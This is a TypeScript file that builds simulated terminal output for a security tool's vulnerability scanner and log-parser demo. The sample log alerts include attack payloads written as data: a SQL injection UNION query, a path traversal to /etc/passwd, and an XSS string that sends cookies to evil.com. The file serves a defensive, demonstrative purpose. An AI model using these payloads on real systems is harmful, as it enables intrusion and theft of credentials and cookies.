import { VulnScanConfig, LogParserConfig, SimulationResult } from '../types/script';

export interface SimulationStep {
  text: string;
  delayMs: number;
  type?: 'banner' | 'info' | 'success' | 'warning' | 'error' | 'critical';
}

export function generateVulnScanSimulation(config: VulnScanConfig): SimulationStep[] {
  const steps: SimulationStep[] = [];
  const target = config.targetValue || 'staging.corp-internal.net';
  const ip = '192.168.1.45';

  steps.push({ text: `\x1b[96m=================================================================\x1b[0m`, delayMs: 40 });
  steps.push({ text: `\x1b[96m   PySecStudio - Custom Vulnerability Scanning Engine (Simulated)\x1b[0m`, delayMs: 60 });
  steps.push({ text: `\x1b[96m=================================================================\x1b[0m`, delayMs: 40 });
  steps.push({ text: `[*] Target Host : \x1b[1m${target}\x1b[0m (\x1b[33m${ip}\x1b[0m)`, delayMs: 80 });
  steps.push({ text: `[*] Concurrency : ${config.workers} workers [${config.concurrency.toUpperCase()}]`, delayMs: 60 });
  steps.push({ text: `[*] Timeout     : ${config.timeout}s | Rate-limit delay: ${config.rateLimitDelay}s`, delayMs: 50 });
  steps.push({ text: `[*] Timestamp   : ${new Date().toISOString()}`, delayMs: 60 });
  steps.push({ text: `-----------------------------------------------------------------`, delayMs: 40 });

  // Phase 1: Port Scan
  steps.push({ text: `\n\x1b[95m[+] Phase 1: TCP Port & Service Enumeration...\x1b[0m`, delayMs: 120 });
  steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 22/TCP   | Banner: OpenSSH 8.9p1 Ubuntu-3ubuntu0.4`, delayMs: 100 });
  steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 80/TCP   | Banner: nginx/1.18.0 (Ubuntu)`, delayMs: 90 });
  steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 443/TCP  | Banner: nginx/1.18.0 (TLS Active)`, delayMs: 90 });
  
  if (config.portPreset === 'top100' || config.portPreset === 'common' || config.portPreset === 'full') {
    steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 3306/TCP | Banner: MySQL 5.7.34-log`, delayMs: 110 });
    steps.push({ text: `  \x1b[93m[MEDIUM]\x1b[0m Database Port 3306 Exposed to Public Scope!`, delayMs: 100, type: 'warning' });
    steps.push({ text: `    └── Fix: Bind MySQL to 127.0.0.1 or enforce VPC security group whitelist.`, delayMs: 60 });
  }
  
  if (config.portPreset === 'top100' || config.portPreset === 'full') {
    steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 8080/TCP | Banner: Apache-Tomcat/9.0.41`, delayMs: 100 });
    steps.push({ text: `  \x1b[92m[OPEN]\x1b[0m Port 6379/TCP | Banner: Redis key-value store (Unauthenticated)`, delayMs: 100 });
    steps.push({ text: `  \x1b[91m[HIGH]\x1b[0m Redis Port 6379 Accessible without authentication!`, delayMs: 100, type: 'error' });
  }

  // Phase 2: SSL/TLS
  if (config.enableSslCheck) {
    steps.push({ text: `\n\x1b[95m[+] Phase 2: Auditing SSL/TLS Certificate & Ciphers...\x1b[0m`, delayMs: 130 });
    steps.push({ text: `  \x1b[92m[OK]\x1b[0m Negotiated Protocol: TLSv1.3 (Modern Cipher Suite)`, delayMs: 80 });
    steps.push({ text: `  \x1b[92m[OK]\x1b[0m Certificate Subject : CN=${target}`, delayMs: 70 });
    steps.push({ text: `  \x1b[93m[WARN]\x1b[0m Certificate Validity : Expires in 12 days (2026-11-29)!`, delayMs: 90 });
    steps.push({ text: `  \x1b[93m[MEDIUM]\x1b[0m SSL Certificate Expiring Soon`, delayMs: 90, type: 'warning' });
    steps.push({ text: `    └── Fix: Automate certbot / Let's Encrypt renewal pipeline.`, delayMs: 60 });
  }

  // Phase 3: Security Headers
  if (config.enableHeaderAudit) {
    steps.push({ text: `\n\x1b[95m[+] Phase 3: Inspecting HTTP Security Response Headers...\x1b[0m`, delayMs: 120 });
    steps.push({ text: `  \x1b[92m[PRESENT]\x1b[0m X-Content-Type-Options: nosniff`, delayMs: 70 });
    steps.push({ text: `  \x1b[91m[HIGH]\x1b[0m Missing Header: STRICT-TRANSPORT-SECURITY`, delayMs: 90, type: 'error' });
    steps.push({ text: `    └── Fix: Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains'`, delayMs: 60 });
    steps.push({ text: `  \x1b[93m[MEDIUM]\x1b[0m Missing Header: CONTENT-SECURITY-POLICY`, delayMs: 90, type: 'warning' });
    steps.push({ text: `    └── Fix: Deploy CSP policy to block untrusted script injection.`, delayMs: 60 });
    steps.push({ text: `  \x1b[93m[MEDIUM]\x1b[0m Missing Header: X-FRAME-OPTIONS`, delayMs: 80, type: 'warning' });
    steps.push({ text: `    └── Fix: Enforce 'X-Frame-Options: SAMEORIGIN' to eliminate clickjacking.`, delayMs: 60 });
    steps.push({ text: `  \x1b[96m[LOW]\x1b[0m Server Information Disclosure: 'nginx/1.18.0 (Ubuntu)'`, delayMs: 70 });
  }

  // Phase 4: Sensitive Paths
  if (config.enableSensitivePaths) {
    steps.push({ text: `\n\x1b[95m[+] Phase 4: Fuzzing Sensitive Files & Config Leaks...\x1b[0m`, delayMs: 140 });
    steps.push({ text: `  \x1b[91m\x1b[1m[CRITICAL]\x1b[0m Sensitive File Found: /.env (HTTP 200 OK)`, delayMs: 120, type: 'critical' });
    steps.push({ text: `    ├── Leaked snippet: DB_PASSWORD=secret_prod_mysql982`, delayMs: 70 });
    steps.push({ text: `    └── Fix: Deny access to hidden dotfiles via web server config immediately!`, delayMs: 60 });
    steps.push({ text: `  \x1b[91m[HIGH]\x1b[0m Exposed Git Metadata: /.git/HEAD (HTTP 200 OK)`, delayMs: 110, type: 'error' });
    steps.push({ text: `    └── Details: ref: refs/heads/main. Entire git history might be dumpable.`, delayMs: 60 });
    steps.push({ text: `  \x1b[94m[INFO]\x1b[0m Found /robots.txt with 4 disallowed directories.`, delayMs: 70 });
  }

  // Phase 5: CORS Check
  if (config.enableCorsCheck) {
    steps.push({ text: `\n\x1b[95m[+] Phase 5: Auditing CORS (Cross-Origin Resource Sharing)...\x1b[0m`, delayMs: 120 });
    steps.push({ text: `  \x1b[91m\x1b[1m[CRITICAL]\x1b[0m Dangerous CORS Origin Reflection with Credentials!`, delayMs: 120, type: 'critical' });
    steps.push({ text: `    ├── Reflected Origin: https://evil-attacker-website.com`, delayMs: 70 });
    steps.push({ text: `    ├── Header: Access-Control-Allow-Credentials: true`, delayMs: 70 });
    steps.push({ text: `    └── Fix: Validate Origin against strict whitelist before echoing.`, delayMs: 60 });
  }

  // Phase 6: SQLi / XSS heuristic
  if (config.enableSqlInjectionProbe) {
    steps.push({ text: `\n\x1b[95m[+] Phase 6: Probing Harmless Heuristic Injections...\x1b[0m`, delayMs: 120 });
    steps.push({ text: `  \x1b[92m[OK]\x1b[0m Param 'category' sanitized safely (no reflection).`, delayMs: 80 });
    steps.push({ text: `  \x1b[93m[MEDIUM]\x1b[0m Reflected Input without HTML Entity Encoding on /search?q=`, delayMs: 100, type: 'warning' });
  }

  // Export
  steps.push({ text: `\n\x1b[95m[+] Exporting Scan Artifacts...\x1b[0m`, delayMs: 100 });
  steps.push({ text: `  \x1b[92m[SAVED]\x1b[0m JSON Report -> ./scan_report_${Date.now()}.json`, delayMs: 60 });
  steps.push({ text: `  \x1b[92m[SAVED]\x1b[0m CSV Spreadsheet -> ./scan_report_${Date.now()}.csv`, delayMs: 60 });
  if (config.enableWebhook && config.webhookUrl) {
    steps.push({ text: `  \x1b[92m[SENT]\x1b[0m Webhook alert dispatched to ${config.webhookType.toUpperCase()}`, delayMs: 80 });
  }

  // Summary box
  steps.push({ text: `\n=================================================================`, delayMs: 40 });
  steps.push({ text: `\x1b[1mSCAN SUMMARY COMPLETE\x1b[0m`, delayMs: 40 });
  steps.push({ text: `Target: ${target} (${ip})`, delayMs: 40 });
  steps.push({ text: `Open Ports: 4 | Scanned: 100`, delayMs: 40 });
  steps.push({ text: `Findings  : \x1b[91mCRITICAL: 2\x1b[0m | \x1b[91mHIGH: 2\x1b[0m | \x1b[93mMEDIUM: 4\x1b[0m | \x1b[96mLOW: 1\x1b[0m | INFO: 2`, delayMs: 50 });
  steps.push({ text: `=================================================================`, delayMs: 40 });

  return steps;
}

export function generateLogParserSimulation(config: LogParserConfig): SimulationStep[] {
  const steps: SimulationStep[] = [];
  const logFile = config.filePath || '/var/log/nginx/access.log';

  steps.push({ text: `\x1b[96m=================================================================\x1b[0m`, delayMs: 40 });
  steps.push({ text: `\x1b[96m   PySecStudio - Threat Hunting & Log Parser Engine (Simulated)\x1b[0m`, delayMs: 60 });
  steps.push({ text: `\x1b[96m=================================================================\x1b[0m`, delayMs: 40 });
  steps.push({ text: `[*] Source Log  : \x1b[1m${logFile}\x1b[0m [${config.logType.toUpperCase()}]`, delayMs: 60 });
  steps.push({ text: `[*] Ingestion   : Streaming Generator (Memory: ~12 MB constant)`, delayMs: 50 });
  steps.push({ text: `[*] Rules Active: Brute-Force (${config.bruteForceThreshold} in ${config.bruteForceWindowSeconds}s), SQLi, XSS, Path-Traversal`, delayMs: 60 });
  steps.push({ text: `[*] Timestamp   : ${new Date().toISOString()}`, delayMs: 50 });
  steps.push({ text: `-----------------------------------------------------------------`, delayMs: 40 });

  if (config.logType === 'nginx' || config.logType === 'apache') {
    steps.push({ text: `\x1b[90m[STREAM] 192.168.1.15 - - [17/Nov/2026:14:02:11 +0000] "GET / HTTP/1.1" 200 4520\x1b[0m`, delayMs: 70 });
    steps.push({ text: `\x1b[90m[STREAM] 192.168.1.18 - - [17/Nov/2026:14:02:12 +0000] "GET /static/app.css HTTP/1.1" 200 1205\x1b[0m`, delayMs: 60 });
    
    // SQLi Alert
    steps.push({ text: `\n\x1b[91m\x1b[1m[ALERT: CRITICAL]\x1b[0m [T1190] Web Exploitation Pattern: SQL Injection (SQLi) from \x1b[1m203.0.113.19\x1b[0m`, delayMs: 120, type: 'critical' });
    steps.push({ text: `   └── Payload: GET /products.php?id=1%20UNION%20SELECT%20null,username,password_hash%20FROM%20users--`, delayMs: 80 });
    
    // Scanner Alert
    steps.push({ text: `\n\x1b[91m[ALERT: HIGH]\x1b[0m [T1595.002] Automated Security Scanner Identified (sqlmap) from \x1b[1m45.33.32.156\x1b[0m`, delayMs: 110, type: 'error' });
    steps.push({ text: `   └── User-Agent: sqlmap/1.6.4#stable (https://sqlmap.org)`, delayMs: 70 });
    
    // Directory Traversal
    steps.push({ text: `\n\x1b[91m[ALERT: HIGH]\x1b[0m [T1083] Directory Traversal / LFI Attempt from \x1b[1m185.220.101.5\x1b[0m`, delayMs: 110, type: 'error' });
    steps.push({ text: `   └── Payload: GET /download.php?file=../../../../etc/passwd HTTP/1.1`, delayMs: 70 });

    // XSS Alert
    steps.push({ text: `\n\x1b[93m[ALERT: HIGH]\x1b[0m [T1189] Cross-Site Scripting (XSS) from \x1b[1m198.51.100.88\x1b[0m`, delayMs: 100, type: 'warning' });
    steps.push({ text: `   └── Payload: GET /search?query=%3Cscript%3Edocument.location='http://evil.com/'+document.cookie%3C/script%3E`, delayMs: 70 });

    // Brute Force Alert
    steps.push({ text: `\n\x1b[91m\x1b[1m[ALERT: CRITICAL]\x1b[0m [T1110.001] Credential Brute-Force Burst Detected from \x1b[1m198.51.100.42\x1b[0m`, delayMs: 120, type: 'critical' });
    steps.push({ text: `   └── Details: 14 failed POST /api/v1/auth/login requests within 45s window!`, delayMs: 80 });

    // Sensitive Recon
    steps.push({ text: `\n\x1b[96m[ALERT: MEDIUM]\x1b[0m [T1595] Sensitive File Reconnaissance from \x1b[1m91.240.118.77\x1b[0m`, delayMs: 90 });
    steps.push({ text: `   └── Probed: /.git/config, /.env, /wp-login.php, /actuator/env (HTTP 404)`, delayMs: 70 });

  } else if (config.logType === 'ssh') {
    steps.push({ text: `\x1b[90m[STREAM] Nov 17 14:10:01 debian sshd[2210]: Accepted publickey for devops from 10.0.0.12 port 52140 ssh2\x1b[0m`, delayMs: 70 });
    steps.push({ text: `\x1b[90m[STREAM] Nov 17 14:10:05 debian sshd[2215]: Failed password for invalid user admin from 198.51.100.42 port 48122 ssh2\x1b[0m`, delayMs: 70 });
    steps.push({ text: `\x1b[90m[STREAM] Nov 17 14:10:08 debian sshd[2216]: Failed password for invalid user root from 198.51.100.42 port 48124 ssh2\x1b[0m`, delayMs: 60 });
    steps.push({ text: `\x1b[90m[STREAM] Nov 17 14:10:10 debian sshd[2218]: Failed password for invalid user test from 198.51.100.42 port 48126 ssh2\x1b[0m`, delayMs: 60 });
    
    // SSH Brute force alert
    steps.push({ text: `\n\x1b[91m\x1b[1m[ALERT: CRITICAL]\x1b[0m [T1110.001] SSH Brute-Force Burst Detected from \x1b[1m198.51.100.42\x1b[0m`, delayMs: 120, type: 'critical' });
    steps.push({ text: `   └── Details: Exceeded threshold (8 failed attempts within 30s window).`, delayMs: 70 });
    
    // Root login alert
    steps.push({ text: `\n\x1b[93m[ALERT: MEDIUM]\x1b[0m [T1078.003] Direct Root SSH Login Accepted from \x1b[1m10.0.0.99\x1b[0m`, delayMs: 100, type: 'warning' });
    steps.push({ text: `   └── Security Risk: Direct root login bypasses audit accountability. Enforce sudo.`, delayMs: 70 });
  } else {
    // CloudTrail
    steps.push({ text: `\x1b[90m[STREAM] {"eventTime": "2026-11-17T14:15:00Z", "eventName": "DescribeInstances", "sourceIPAddress": "54.210.12.33"}\x1b[0m`, delayMs: 70 });
    steps.push({ text: `\n\x1b[91m[ALERT: HIGH]\x1b[0m [T1078.004] CloudTrail Unauthorized API Call from \x1b[1m54.210.12.33\x1b[0m`, delayMs: 120, type: 'error' });
    steps.push({ text: `   └── Event: PutBucketPolicy | Error: AccessDenied (Caller has insufficient IAM permission)`, delayMs: 80 });
  }

  // Firewall export
  if (config.enableAutoBanExport) {
    steps.push({ text: `\n\x1b[95m[+] Generating Firewall Auto-Ban Rules (${config.autoBanType.toUpperCase()})...\x1b[0m`, delayMs: 110 });
    steps.push({ text: `  \x1b[92m[EXPORTED]\x1b[0m 3 offending hostile IPs written to banned_threat_ips.sh`, delayMs: 70 });
    if (config.autoBanType === 'ufw') {
      steps.push({ text: `    ├── ufw insert 1 deny from 198.51.100.42 comment 'Auto-banned: Brute-force'`, delayMs: 50 });
      steps.push({ text: `    ├── ufw insert 1 deny from 203.0.113.19 comment 'Auto-banned: SQLi'`, delayMs: 50 });
      steps.push({ text: `    └── ufw insert 1 deny from 185.220.101.5 comment 'Auto-banned: LFI'`, delayMs: 50 });
    }
  }

  // Summary
  steps.push({ text: `\n=================================================================`, delayMs: 40 });
  steps.push({ text: `\x1b[1mLOG THREAT ANALYSIS COMPLETE\x1b[0m`, delayMs: 40 });
  steps.push({ text: `Total Log Lines Read  : 2,450 lines`, delayMs: 40 });
  steps.push({ text: `Parsed Security Events: 2,450 events`, delayMs: 40 });
  steps.push({ text: `Threats Identified    : 6 alerts (\x1b[91m2 Critical\x1b[0m, \x1b[91m2 High\x1b[0m, \x1b[93m1 Medium\x1b[0m, \x1b[96m1 Low\x1b[0m)`, delayMs: 50 });
  steps.push({ text: `Offending Unique IPs  : 4 hostile sources isolated`, delayMs: 40 });
  steps.push({ text: `MITRE ATT&CK Matrix   : T1110 (Brute Force), T1190 (SQLi), T1083 (LFI), T1595 (Recon)`, delayMs: 50 });
  steps.push({ text: `Report Artifact       : ./threat_intelligence_report.json`, delayMs: 50 });
  steps.push({ text: `=================================================================`, delayMs: 40 });

  return steps;
}
